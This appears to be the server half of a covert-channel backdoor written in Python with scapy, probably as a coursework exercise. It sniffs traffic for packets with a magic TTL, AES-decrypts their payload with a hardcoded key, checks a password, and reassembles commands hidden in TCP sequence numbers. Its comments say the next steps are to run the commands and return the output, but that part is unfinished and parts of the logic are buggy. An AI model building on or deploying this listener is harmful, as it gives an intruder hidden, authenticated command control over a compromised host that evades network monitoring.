from scapy.all import *
from Crypto.Cipher import AES
#Inputs
victimIP = "192.168.0.1"
ttlKey = 164
srcPort = 80
dstPort = 53
key = "0123456789abcdef"
IV = "abcdefghijklmnop"
commands = []
authentication = "TEST!"

def decrypt(command):
    global key
    global IV
    decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain

def encryptCommand(command):
    global key
    global IV
    encryptor = AES.new(key,AES.MODE_CFB,IV=IV)
    plain = encryptor.encrypt(command)
    return plain

def addToCommands(commands,UID,total,covertContent):
    #Edge case if command array is empty
    if(len(commands) == 0):
        print 'Commands is empty, creating a new element'
        element = [UID,[int(total)],[covertContent]]
        commands.append(element)
        print commands
        #The first element of COmmand has UID
        #print commands[0][1]
        #print "\n\n\n\n"
    #If the commands array is NOT empty, search by UID
    else:
        #find the element which has the same UID
        for element in commands:
            if(element[0] == UID):
                element[2].append(covertContent)
                # print commands
            #If NONE of the elements have the same UID, create a
            #new entry
            else:
                element = [UID,[int(total)],[covertContent]]
                commands.append(element)
            pass

def checkCommands(UID):
    for element in commands:
        print element
        if(element[0] == UID):
            total = element[1][0]
            print "The total amount of commands is " + str(total)
            numMessages = len(element[2])
            print "The number of messages is " + str(numMessages)
            if(numMessages == total):
                return True
            else: return False
        pass
        return False

def reconstructCommand(UID):
    for element in commands:
        #print element
        text =""
        if(element[0] == UID):
            data = element[2]
            print data
            for value in data:
                text = text + str(value)
                pass
            print int(text)


        pass

def server(pkt):
    global command
    global authentication
    #Checks if its TCP
    if pkt.haslayer(TCP):
        ttl = pkt[IP].ttl
        #Checks if the ttl matches with ours
        if ttl == ttlKey:
            src_ip = pkt[IP].src
            payload = pkt["Raw"].load
            #Decrypt payload, sequence number
            decryptedData = decrypt(payload)
            print "Packet payload " + decryptedData
            #Check if password in payload is correct
            payload  = decryptedData.split("\n")
            password = payload[0]
            print "Password: " + password
            if(password == authentication):
                UID = payload[1]
                position = payload[2].split(":")[0]
                total = payload[2].split(":")[1]
                #Check if position and total matches and if it does execute command
                print "Password matches!"

                #decrypt the covert contents
                print "Covert content = " + str(pkt[TCP].seq)
                #convert to binary
                covertContent = bin(pkt[TCP].seq)[2:]
                print "binary is " + covertContent

                #If there is only 1 message for this command, reconstruct it
                if(total ==1):
                    print "Only one message, just reconstruct it"
                #Else, add to an array
                else:
                    addToCommands(commands,UID,total,covertContent)
                    #After every add, check if the max has been reached
                    if(checkCommands(UID)):
                        print "Max reached, reconstruct command"
                        reconstructCommand(UID)
                    else:
                        print "Max not reached, don't reconstruct command yet"


            #Encrypt the output, password, position and total

            #Send it back
    #Checks if its UDP
    elif pkt.haslayer(UDP):
        ttl = pkt[IP].ttl
        #Checks if the ttl matches with ours
        if ttl == ttlKey:
            pkt.show()
            src_ip = pkt[IP].src
            #Decrypt payload, source port

            #Check if password in payload is correct

            #check if position and total matches and if it does execute command




sniff(filter="ip", prn=server)
